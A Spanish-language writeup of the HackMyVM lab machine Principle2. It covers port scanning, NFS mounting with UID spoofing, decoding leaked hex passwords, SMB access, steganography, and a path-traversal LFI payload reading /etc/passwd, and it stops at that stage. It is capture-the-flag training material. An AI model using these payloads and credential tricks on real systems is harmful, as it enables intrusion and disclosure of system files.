---
title: Principle2 - HackMyVM Writeup
date: 2023-12-25
categories: [Writeups, HMV]
tags: [Linux, NFS enumeration, SMB, Esteganografia, Information Leakage, LFI(Log Poisoned), PrivEsc]
---
![](/assets/img/Principle2/principle2.png)

Hola a todos! El día de hoy vamos a resolver la maquina `Principle2` creada por [kaian](https://kaianperez.github.io/). La díficultad de esta máquina es 
Medium.

## Enumeración
---
### Puertos

Comenzamos el escaneo de puertos con `nmap`:
```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 192.168.101.11 -oG allports
```

#### Opciones Utilizadas en el `escaneo`:
- `-p-`: Escaneo de los 65535 puertos.
- `--open`: Filtrar por aquellos puertos que tienen un estado abierto.
- `-sS`: Realizar un escaneo de tipo "TCP SYN". Si recibe un paquete SYN/ACK de vuelta, indica que el puerto está abierto. Si recibe un paquete de tipo RST (reset), significa que el puerto está cerrado.
- `--min-rate 5000`: Lanzar 5000 paquetes por segundo.
- `-n`: No realizar una resolución DNS.
- `-vvv`: Mostrar por pantalla información del escaneo.
- `-Pn`: No realizar un (host discovery) de la ip de la máquina víctima
- `192.168.101.11`: Ip de la maquina víctima
- `-oG allports` : Guardar la salida del escaneo en formato Greppable en el archivo allports.

```bash
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 64
111/tcp   open  rpcbind      syn-ack ttl 64
139/tcp   open  netbios-ssn  syn-ack ttl 64
445/tcp   open  microsoft-ds syn-ack ttl 64
2049/tcp  open  nfs          syn-ack ttl 64
36473/tcp open  unknown      syn-ack ttl 64
39667/tcp open  unknown      syn-ack ttl 64
47007/tcp open  unknown      syn-ack ttl 64
51255/tcp open  unknown      syn-ack ttl 64
57159/tcp open  unknown      syn-ack ttl 64
```
Utilizamos  la utilidad extractPorts del señor [savitar](https://github.com/s4vitar)  para extraer los puertos y
tenerlos copiados en la clipboard.

```bash
extractPorts allports

[*] Extracting information...

    [*] IP Address: 192.168.101.11
    [*] Open ports: 80,111,139,445,2049,36473,39667,47007,51255,57159

[*] Ports copied to clipboard

```

Procedemos a realizar un escaneo de versiones y lanzar algunos scripts de enumeracion.

```bash
nmap -p80,111,139,445,2049,36473,39667,47007,51255,57159 -sCV -vvv 192.168.101.11 -oN targeted
```
```bash
Nmap scan report for principle2 (192.168.101.11)
Host is up, received arp-response (0.00040s latency).
Scanned at 2023-12-25 10:28:05 -05 for 19s

PORT      STATE SERVICE     REASON         VERSION
80/tcp    open  http        syn-ack ttl 64 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: nginx/1.22.1
111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      47048/udp6  mountd
|   100005  1,2,3      47407/tcp6  mountd
|   100005  1,2,3      51255/tcp   mountd
|   100005  1,2,3      52304/udp   mountd
|   100021  1,3,4      36473/tcp   nlockmgr
|   100021  1,3,4      39411/udp6  nlockmgr
|   100021  1,3,4      43348/udp   nlockmgr
|   100021  1,3,4      45563/tcp6  nlockmgr
|   100024  1          47007/tcp   status
|   100024  1          48893/tcp6  status
|   100024  1          50602/udp6  status
|   100024  1          53235/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
2049/tcp  open  nfs_acl     syn-ack ttl 64 3 (RPC #100227)
36473/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)
39667/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
47007/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
51255/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
57159/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
MAC Address: 08:00:27:CF:24:35 (Oracle VirtualBox virtual NIC)

Host script results:
|_clock-skew: 4s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57467/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14274/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25796/udp): CLEAN (Failed to receive data)
|   Check 4 (port 43233/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-12-25T15:28:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
Nmap scan report for principle2 (192.168.101.11)
Host is up, received arp-response (0.00040s latency).
Scanned at 2023-12-25 10:28:05 -05 for 19s
```

#### Opciones utilizadas en el `escaneo`:
- `-p80,111,139,445,2049,36473,39667,47007,51255,57159`: Especificamos los puertos a escanear.
- `-sCV`: Lanzamos el escaneo de versiones con el parametro "V" y de scripts con el parametro "C":
- `-vvv`: Mostrar por pantalla información del escaneo.
- `192.168.101.11`: Ip de la máquina víctima.
- `-oN targeted`: Guardar la salida del escaneo en formato Nmap en el archivo targeted.

## NFS

Verificando el escaneo de las versiones vemos que el puerto 111 de `rpcbind` esta abierto.
RPCBIND permite la resolución dinámica de servicios RPC en un sistema remoto. Básicamente, su función es la de un "directorio" que mapea los servicios RPC disponibles en un servidor y los puertos en los que esos servicios están escuchando.

Entre todos los servicios que estan en escucha llama la atención el servidor `nfs`.

¿Qué es NFS?

NFS (Network File System) es un protocolo que permite a los usuarios acceder y compartir archivos almacenados en servidores remotos a través de una red

```bash
111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      47048/udp6  mountd
|   100005  1,2,3      47407/tcp6  mountd
|   100005  1,2,3      51255/tcp   mountd
|   100005  1,2,3      52304/udp   mountd
|   100021  1,3,4      36473/tcp   nlockmgr
|   100021  1,3,4      39411/udp6  nlockmgr
|   100021  1,3,4      43348/udp   nlockmgr
|   100021  1,3,4      45563/tcp6  nlockmgr
|   100024  1          47007/tcp   status
|   100024  1          48893/tcp6  status
|   100024  1          50602/udp6  status
|   100024  1          53235/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
```
### Verificando las carpetas compartidas.
Tenemos dos carpetas que se están compartiendo.

```bash
showmount -e 192.168.101.11
Export list for 192.168.101.11:
/var/backups *
/home/byron  *
```
### Montando las carpetas compartidas.

Creamos dos carpetas correspondientes en el directorio /mnt.

```bash
mkdir /mnt/backups
mkdir /mnt/byron
```
Montamos las dos carpetas.
```bash
mount -t nfs 192.168.101.11:/var/backups /mnt/backups
mount -t nfs 192.168.101.11:/home/byron /mnt/byron
```

Empezamos enumerando la carpeta `/mnt/backups`.
Al ingresar nos dice que no tenemos permiso.
```bash
cd /mnt/backups
cd: permission denied: /mnt/backups
```
Esto se debe a los permisos. Si vemos el UID es `54` y solo el usuario con ese UID puede ingresar a `backups`.

```bash
ls -ld backups
drwxr--r-- 54 backup 28 KB Tue Nov 28 19:00:04 2023  backups
```
Lo que vamos a ser es crear un usuario con ese UID para poder acceder.
440u
```bash
sudo useradd marcos -u 54
useradd warning: marcos's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.
passwd marcos
New password: 
Retype new password: 
passwd: password updated successfully

su marcos
$ bash
marcos@rise:/mnt$ cd backups/
marcos@rise:/mnt/backups$ ls
0.txt	 176.txt  254.txt  332.txt  410.txt  49.txt   568.txt	646.txt  724.txt  802.txt  881.txt  96.txt
1.txt	 177.txt  255.txt  333.txt  411.txt  490.txt  569.txt	647.txt  725.txt  803.txt  882.txt  960.txt
10.txt	 178.txt  256.txt  334.txt  412.txt  491.txt  57.txt	648.txt  726.txt  804.txt  883.txt  961.txt
100.txt   179.txt  257.txt  335.txt  413.txt  492.txt  570.txt	649.txt  727.txt  805.txt  884.txt  962.txt
1000.txt  18.txt   258.txt  336.txt  414.txt  493.txt  571.txt	65.txt	728.txt  806.txt  885.txt  963.txt
101.txt   180.txt  259.txt  337.txt  415.txt  494.txt  572.txt	650.txt  729.txt  807.txt  886.txt  964.txt
102.txt   181.txt  26.txt   338.txt  416.txt  495.txt  573.txt	651.txt  73.txt   808.txt  887.txt  965.txt
103.txt   182.txt  260.txt  339.txt  417.txt  496.txt  574.txt	652.txt  730.txt  809.txt  888.txt  966.txt
104.txt   183.txt  261.txt  34.txt   418.txt  497.txt  575.txt	653.txt  731.txt  81.txt   889.txt  967.txt
105.txt   184.txt  262.txt  340.txt  419.txt  498.txt  576.txt	654.txt  732.txt  810.txt  89.txt   968.txt
106.txt   185.txt  263.txt  341.txt  42.txt   499.txt  577.txt	655.txt  733.txt  811.txt  890.txt  969.txt
107.txt   186.txt  264.txt  342.txt  420.txt  5.txt    578.txt	656.txt  734.txt  812.txt  891.txt  97.txt
108.txt   187.txt  265.txt  343.txt  421.txt  50.txt   579.txt	657.txt  735.txt  813.txt  892.txt  970.txt
109.txt   188.txt  266.txt  344.txt  422.txt  500.txt  58.txt	658.txt  736.txt  814.txt  893.txt  971.txt
11.txt	 189.txt  267.txt  345.txt  423.txt  501.txt  580.txt	659.txt  737.txt  815.txt  894.txt  972.txt
110.txt   19.txt   268.txt  346.txt  424.txt  502.txt  581.txt	66.txt	738.txt  816.txt  895.txt  973.txt
111.txt   190.txt  269.txt  347.txt  425.txt  503.txt  582.txt	660.txt  739.txt  817.txt  896.txt  974.txt
112.txt   191.txt  27.txt   348.txt  426.txt  504.txt  583.txt	661.txt  74.txt   818.txt  897.txt  975.txt
113.txt   192.txt  270.txt  349.txt  427.txt  505.txt  584.txt	662.txt  740.txt  819.txt  898.txt  976.txt
114.txt   193.txt  271.txt  35.txt   428.txt  506.txt  585.txt	663.txt  741.txt  82.txt   899.txt  977.txt
115.txt   194.txt  272.txt  350.txt  429.txt  507.txt  586.txt	664.txt  742.txt  820.txt  9.txt    978.txt
116.txt   195.txt  273.txt  351.txt  43.txt   508.txt  587.txt	665.txt  743.txt  821.txt  90.txt   979.txt
117.txt   196.txt  274.txt  352.txt  430.txt  509.txt  588.txt	666.txt  744.txt  822.txt  900.txt  98.txt
118.txt   197.txt  275.txt  353.txt  431.txt  51.txt   589.txt	667.txt  745.txt  823.txt  901.txt  980.txt
119.txt   198.txt  276.txt  354.txt  432.txt  510.txt  59.txt	668.txt  746.txt  824.txt  902.txt  981.txt
12.txt	 199.txt  277.txt  355.txt  433.txt  511.txt  590.txt	669.txt  747.txt  825.txt  903.txt  982.txt
120.txt   2.txt    278.txt  356.txt  434.txt  512.txt  591.txt	67.txt	748.txt  826.txt  904.txt  983.txt
121.txt   20.txt   279.txt  357.txt  435.txt  513.txt  592.txt	670.txt  749.txt  827.txt  905.txt  984.txt
122.txt   200.txt  28.txt   358.txt  436.txt  514.txt  593.txt	671.txt  75.txt   828.txt  906.txt  985.txt
123.txt   201.txt  280.txt  359.txt  437.txt  515.txt  594.txt	672.txt  750.txt  829.txt  907.txt  986.txt
124.txt   202.txt  281.txt  36.txt   438.txt  516.txt  595.txt	673.txt  751.txt  83.txt   908.txt  987.txt
125.txt   203.txt  282.txt  360.txt  439.txt  517.txt  596.txt	674.txt  752.txt  830.txt  909.txt  988.txt
126.txt   204.txt  283.txt  361.txt  44.txt   518.txt  597.txt	675.txt  753.txt  831.txt  91.txt   989.txt
127.txt   205.txt  284.txt  362.txt  440.txt  519.txt  598.txt	676.txt  754.txt  832.txt  910.txt  99.txt
128.txt   206.txt  285.txt  363.txt  441.txt  52.txt   599.txt	677.txt  755.txt  833.txt  911.txt  990.txt
129.txt   207.txt  286.txt  364.txt  442.txt  520.txt  6.txt	678.txt  756.txt  834.txt  912.txt  991.txt
13.txt	 208.txt  287.txt  365.txt  443.txt  521.txt  60.txt	679.txt  757.txt  835.txt  913.txt  992.txt
130.txt   209.txt  288.txt  366.txt  444.txt  522.txt  600.txt	68.txt	758.txt  836.txt  914.txt  993.txt
131.txt   21.txt   289.txt  367.txt  445.txt  523.txt  601.txt	680.txt  759.txt  837.txt  915.txt  994.txt
132.txt   210.txt  29.txt   368.txt  446.txt  524.txt  602.txt	681.txt  76.txt   838.txt  916.txt  995.txt
133.txt   211.txt  290.txt  369.txt  447.txt  525.txt  603.txt	682.txt  760.txt  839.txt  917.txt  996.txt
134.txt   212.txt  291.txt  37.txt   448.txt  526.txt  604.txt	683.txt  761.txt  84.txt   918.txt  997.txt
135.txt   213.txt  292.txt  370.txt  449.txt  527.txt  605.txt	684.txt  762.txt  840.txt  919.txt  998.txt
136.txt   214.txt  293.txt  371.txt  45.txt   528.txt  606.txt	685.txt  763.txt  841.txt  92.txt   999.txt
137.txt   215.txt  294.txt  372.txt  450.txt  529.txt  607.txt	686.txt  764.txt  842.txt  920.txt  alternatives.tar.0
138.txt   216.txt  295.txt  373.txt  451.txt  53.txt   608.txt	687.txt  765.txt  843.txt  921.txt  apt.extended_states.0
139.txt   217.txt  296.txt  374.txt  452.txt  530.txt  609.txt	688.txt  766.txt  844.txt  922.txt  apt.extended_states.1.gz
14.txt	 218.txt  297.txt  375.txt  453.txt  531.txt  61.txt	689.txt  767.txt  845.txt  923.txt  apt.extended_states.2.gz
140.txt   219.txt  298.txt  376.txt  454.txt  532.txt  610.txt	69.txt	768.txt  846.txt  924.txt  apt.extended_states.3.gz
141.txt   22.txt   299.txt  377.txt  455.txt  533.txt  611.txt	690.txt  769.txt  847.txt  925.txt  apt.extended_states.4.gz
142.txt   220.txt  3.txt    378.txt  456.txt  534.txt  612.txt	691.txt  77.txt   848.txt  926.txt  apt.extended_states.5.gz
143.txt   221.txt  30.txt   379.txt  457.txt  535.txt  613.txt	692.txt  770.txt  849.txt  927.txt  apt.extended_states.6.gz
144.txt   222.txt  300.txt  38.txt   458.txt  536.txt  614.txt	693.txt  771.txt  85.txt   928.txt  dpkg.arch.0
145.txt   223.txt  301.txt  380.txt  459.txt  537.txt  615.txt	694.txt  772.txt  850.txt  929.txt  dpkg.arch.1.gz
146.txt   224.txt  302.txt  381.txt  46.txt   538.txt  616.txt	695.txt  773.txt  851.txt  93.txt   dpkg.arch.2.gz
147.txt   225.txt  303.txt  382.txt  460.txt  539.txt  617.txt	696.txt  774.txt  852.txt  930.txt  dpkg.arch.3.gz
148.txt   226.txt  304.txt  383.txt  461.txt  54.txt   618.txt	697.txt  775.txt  853.txt  931.txt  dpkg.arch.4.gz
149.txt   227.txt  305.txt  384.txt  462.txt  540.txt  619.txt	698.txt  776.txt  854.txt  932.txt  dpkg.arch.5.gz
15.txt	 228.txt  306.txt  385.txt  463.txt  541.txt  62.txt	699.txt  777.txt  855.txt  933.txt  dpkg.diversions.0
150.txt   229.txt  307.txt  386.txt  464.txt  542.txt  620.txt	7.txt	778.txt  856.txt  934.txt  dpkg.diversions.1.gz
151.txt   23.txt   308.txt  387.txt  465.txt  543.txt  621.txt	70.txt	779.txt  857.txt  935.txt  dpkg.diversions.2.gz
152.txt   230.txt  309.txt  388.txt  466.txt  544.txt  622.txt	700.txt  78.txt   858.txt  936.txt  dpkg.diversions.3.gz
153.txt   231.txt  31.txt   389.txt  467.txt  545.txt  623.txt	701.txt  780.txt  859.txt  937.txt  dpkg.diversions.4.gz
154.txt   232.txt  310.txt  39.txt   468.txt  546.txt  624.txt	702.txt  781.txt  86.txt   938.txt  dpkg.diversions.5.gz
155.txt   233.txt  311.txt  390.txt  469.txt  547.txt  625.txt	703.txt  782.txt  860.txt  939.txt  dpkg.statoverride.0
156.txt   234.txt  312.txt  391.txt  47.txt   548.txt  626.txt	704.txt  783.txt  861.txt  94.txt   dpkg.statoverride.1.gz
157.txt   235.txt  313.txt  392.txt  470.txt  549.txt  627.txt	705.txt  784.txt  862.txt  940.txt  dpkg.statoverride.2.gz
158.txt   236.txt  314.txt  393.txt  471.txt  55.txt   628.txt	706.txt  785.txt  863.txt  941.txt  dpkg.statoverride.3.gz
159.txt   237.txt  315.txt  394.txt  472.txt  550.txt  629.txt	707.txt  786.txt  864.txt  942.txt  dpkg.statoverride.4.gz
16.txt	 238.txt  316.txt  395.txt  473.txt  551.txt  63.txt	708.txt  787.txt  865.txt  943.txt  dpkg.statoverride.5.gz
160.txt   239.txt  317.txt  396.txt  474.txt  552.txt  630.txt	709.txt  788.txt  866.txt  944.txt  dpkg.status.0
161.txt   24.txt   318.txt  397.txt  475.txt  553.txt  631.txt	71.txt	789.txt  867.txt  945.txt  dpkg.status.1.gz
162.txt   240.txt  319.txt  398.txt  476.txt  554.txt  632.txt	710.txt  79.txt   868.txt  946.txt  dpkg.status.2.gz
163.txt   241.txt  32.txt   399.txt  477.txt  555.txt  633.txt	711.txt  790.txt  869.txt  947.txt  dpkg.status.3.gz
164.txt   242.txt  320.txt  4.txt    478.txt  556.txt  634.txt	712.txt  791.txt  87.txt   948.txt  dpkg.status.4.gz
165.txt   243.txt  321.txt  40.txt   479.txt  557.txt  635.txt	713.txt  792.txt  870.txt  949.txt  dpkg.status.5.gz
166.txt   244.txt  322.txt  400.txt  48.txt   558.txt  636.txt	714.txt  793.txt  871.txt  95.txt
167.txt   245.txt  323.txt  401.txt  480.txt  559.txt  637.txt	715.txt  794.txt  872.txt  950.txt
168.txt   246.txt  324.txt  402.txt  481.txt  56.txt   638.txt	716.txt  795.txt  873.txt  951.txt
169.txt   247.txt  325.txt  403.txt  482.txt  560.txt  639.txt	717.txt  796.txt  874.txt  952.txt
17.txt	 248.txt  326.txt  404.txt  483.txt  561.txt  64.txt	718.txt  797.txt  875.txt  953.txt
170.txt   249.txt  327.txt  405.txt  484.txt  562.txt  640.txt	719.txt  798.txt  876.txt  954.txt
171.txt   25.txt   328.txt  406.txt  485.txt  563.txt  641.txt	72.txt	799.txt  877.txt  955.txt
172.txt   250.txt  329.txt  407.txt  486.txt  564.txt  642.txt	720.txt  8.txt	 878.txt  956.txt
173.txt   251.txt  33.txt   408.txt  487.txt  565.txt  643.txt	721.txt  80.txt   879.txt  957.txt
174.txt   252.txt  330.txt  409.txt  488.txt  566.txt  644.txt	722.txt  800.txt  88.txt   958.txt
175.txt   253.txt  331.txt  41.txt   489.txt  567.txt  645.txt	723.txt  801.txt  880.txt  959.txt

```

Vemos una cantidad grande archivos `.txt`. Al realizar un cat a todos estos nos muestran valores hexadecimales.
```bash
marcos@rise:/mnt/backups$ cat *.txt
39847d89f3f8ab674bebfdf434311e40
4a1093b9180a89e5808f40cfdf235e5e
1d62df96761217dbe8668b8d8114babc
011f9e14b4b3de30af45c8f1bf03daa9
0d142f9c63697efaeaf64055e30b82bc
ddd6525c59bee39da8693569070d8d9c
ba562f3597fba81263bfe11c52c326c0
8ee556b9a63d6a74b86f5ca8bfe63066
20cdc443cdf33b5d86c9dbd50df70fdf
2a4a1d68e66cdbb28f6b41377eaf9268
c403ba8ecbbacb95c3329840cfe410f5
bd2605235c5fd60333b6bcb6b8660e7c
3dece0b970be436ed097265f9cf7caa6
....
```
Guardaremos estos valores en un archivo para un futuro.
```
marcos@rise:/mnt/backups$ cat *.txt >> /tmp/hex
```

`/mnt/byron`.

```bash
❯ cd byron
❯ ls
 mayor.txt   memory.txt
❯ cat *.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: mayor.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: memory.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with th
       │ eir number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
Puntos importantes:
- byron,hermanubis: Posibles usuarios del sistema
- Hermanubis ha perdido su contraseña, pero byron tiene un registro de todas las contraseñas de sus vecinos en hexadecimal.

Si byron tiene las contraseñas de todos sus vecinos vamos a ver si encontramos la contraseña de hermanubis, ya que la perdió.
Realizamos el proceso inverso lo pasamos de hexadecimal a data legible mediante un one liner donde representamos los valores en hex y la data legible para cada uno.

```bash
while IFS= read -r line; do  echo "Hex: $line\n"; echo "$line\n" | xxd -ps -r ; echo "\n-----------------------------\n"; done < hex > contraseñas
Hex: 4279726f6e4973417373686f6c650a0a
ByronIsAsshole
```
Dentro de toda la data que obtuvimos , vemos esta cadena que se asemeja a una contraseña.

## SMB

El servicio SMB estaba abierto, verificamos si la contraseña `ByronIsAsshole` es valida para el usuario `hermanubis`.
```bash
❯ smbmap -H 192.168.101.11 -u hermanubis -p ByronIsAsshole

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 192.168.101.11:445	Name: 192.168.101.11      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	public                                            	READ ONLY	New Jerusalem Public
	hermanubis                                        	READ ONLY	Hermanubis share
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
```
Verificamos que es válida. Entonces procedemos a enumerar los recursos compartidos.
Usamos smbclient para entrar a cada carpeta y descargar los recursos.

```bash
smbclient //192.168.101.11/public -U hermanubis%ByronIsAsshole
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 28 06:57:45 2023
  ..                                  D        0  Sat Nov 25 11:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 07:01:00 2023
  straton.txt                         N      718  Sun Nov 19 07:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 07:01:07 2023

		19962704 blocks of size 1024. 17137956 blocks available
smb: \> get new_era.txt 
getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
smb: \> get straton.txt 
getting file \straton.txt of size 718 as straton.txt (100.2 KiloBytes/sec) (average 95.1 KiloBytes/sec)
smb: \> get loyalty.txt 
getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 160.4 KiloBytes/sec)
smb: \> 
```
```bash
❯ cat *.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loyalty.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).
   2   │ 
   3   │ What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what
       │  we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter o
       │ f arrogance, but of responsibility.
   4   │ 
   5   │ 2257686f2061726520796f752c207468656e3f22
   6   │ 
   7   │ To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This i
       │ s not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It
       │  is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it i
       │ s also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril
       │ .
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: new_era.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every u
       │ ser should change their password.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: straton.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Fo
       │ under.
   2   │ 
   3   │ AMYNTAS:    But what does this tell us about the nature of the universe, which is what we were discussing?
   4   │ STRATON:    That is the next question we must undertake to answer. We begin with the self because that is what determines ou
       │ r existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; an
       │ d the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if ma
       │ n is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
De toda esta info no obtenemos nada relevante así que pasamos a la otra carpeta.

```bash
smbclient //192.168.101.11/hermanubis -U hermanubis%ByronIsAsshole
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Nov 28 09:44:44 2023
  ..                                  D        0  Sat Dec 23 11:13:36 2023
  index.html                          N      346  Tue Nov 28 09:44:41 2023
  prometheus.jpg                      N   307344  Tue Nov 28 12:23:24 2023

		19962704 blocks of size 1024. 17137952 blocks available
smb: \> get index.html 
getting file \index.html of size 346 as index.html (48.3 KiloBytes/sec) (average 48.3 KiloBytes/sec)
smb: \> get prometheus.jpg 
getting file \prometheus.jpg of size 307344 as prometheus.jpg (30013.8 KiloBytes/sec) (average 17675.2 KiloBytes/sec)
smb: \> 
```
```bash
cat index.html
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: index.html
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <!DOCTYPE html>
   2   │ <html lang="es">
   3   │ <head>
   4   │     <meta charset="UTF-8">
   5   │     <meta name="viewport" content="width=device-width, initial-scale=1.0">
   6   │     <title>Welcome to the resistance forum</title>
   7   │ </head>
   8   │ <body>
   9   │ 
  10   │     <h1>Welcome to the resistance forum</h1>
  11   │ 
  12   │     <p>free our chains!</p>
  13   │ 
  14   │     <img src="prometheus.jpg" alt="chained">
  15   │ 
  16   │ </body>
  17   │ </html>
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
![](/assets/img/Principle2/prometeus.png)

### Esteganografía
Verificamos si la imagen no tiene archivos ocultos mediante [Esteganografía](https://es.wikipedia.org/wiki/Esteganograf%C3%ADa#:~:text=Se%20llama%20mensaje%20esteganogr%C3%A1fico%20al,%2C%20texto%20plano%2C%20archivos%20binarios.).

Utilizamos la herramienta [stegseek](https://github.com/RickdeJager/stegseek).
```bash
stegseek prometheus.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "soldierofanubis"   
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus.jpg.out".
❯ cat prometheus.jpg.out
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: prometheus.jpg.out
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
### Web
Obtuvimos un dominio, el cual lo vamos a añadir al `/etc/hosts` en caso se aplique [virtualhosting](https://linube.com/ayuda/articulo/267/que-es-un-virtualhost).
```bash
192.168.101.11 thetruthoftalos.hmv
```
Ingresamos a la web y vemos solo el mensaje NOTHING. 

![](/assets/img/Principle2/web.png)
Fuzzeamos para ver si encontramos otros archivos en la web.

```bash
gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thetruthoftalos.hmv/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
/uploads              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]
```
Ingresamos a `/index.php` y vemos una pagina donde nos muestra contenido de un archivo mediante el parametro filename.


![](/assets/img/Principle2/lfi.png)
### LFI
Probamos un LFI de la siguiente forma y obtenemos el contenido del `/etc/passwd`.

```bash
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//etc/passwd
curl -s -X GET http://thetruthoftalos.hmv/index.php\?filename\=....//....//....//....//....//etc/passwd
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
